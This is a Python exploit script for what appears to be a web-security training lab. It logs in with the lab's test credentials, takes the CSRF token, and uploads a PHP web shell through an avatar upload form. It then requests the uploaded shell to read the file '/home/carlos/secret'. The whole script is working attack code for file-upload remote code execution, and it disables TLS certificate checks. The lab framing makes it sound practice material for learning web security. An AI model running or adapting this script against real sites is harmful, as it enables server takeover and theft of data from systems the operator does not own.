# Lab: Remote code execution via web shell upload
# This script uploads a basic PHP web shell and exfiltrates the contents of the file "/home/carlos/secret"
import sys
import urllib3
import requests
import os
from bs4 import BeautifulSoup
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}

with open("get.php", 'rb') as file:
    php_file_content = file.read()


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    print(csrf_token)
    return csrf_token


def get_secret(s, url):
    avatar_url = url + "/files/avatars/get.php"
    r = s.get(avatar_url, verify=False, proxies=proxies)
    print(r.text)


def upload_web_shell(s, url, username):
    login_url = url + "/login"
    csrf = get_csrf_token(s, login_url)
    upload_url = url + "/my-account/avatar"
    data = {"user": username, "csrf": csrf}

    files = {
        "avatar": ("get.php", php_file_content, "application/x-php"),
    }

    r = s.post(upload_url, files=files, data=data, verify=False, proxies=proxies)
    print(csrf)
    print(r.text)
    if r.status_code == 200:
        print("(-> Web shell uploaded")
        get_secret(s, url)

    else:
        print("(-) Couldn't upload the file")
        exit(-1)


def login_user(s, url, csrf):
    login_url = url + "/login"
    username = "wiener"
    password = "peter"
    data = {"csrf": csrf, "username": username, "password": password}
    r = s.post(login_url, data=data, verify=False, proxies=proxies)

    if "My Account" in r.text:
        print("(-> Logged in ")
        upload_web_shell(s, url, username)
    else:
        print("(-) Couldn't  log in")
        exit(-1)


def rce_web_shell_upload(s, url):
    login_url = url + "/login"
    # get csrf token and login
    csrf_token = get_csrf_token(s, login_url)
    login_user(s, url, csrf_token)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> Remote code execution via web shell upload example...")
    s = requests.Session()
    rce_web_shell_upload(s, url)


if __name__ == "__main__":
    main()




